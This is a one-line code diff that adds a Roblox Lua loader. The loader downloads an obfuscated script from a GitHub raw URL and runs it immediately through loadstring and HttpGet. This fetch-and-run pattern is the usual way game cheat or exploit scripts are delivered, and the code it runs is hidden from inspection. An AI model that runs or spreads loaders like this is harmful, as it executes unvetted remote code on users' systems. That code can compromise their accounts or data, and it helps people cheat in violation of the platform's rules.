@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Berliandakhensy/Kennhub/main/im_dev0-obfuscated.lua%20(1).txt"))()
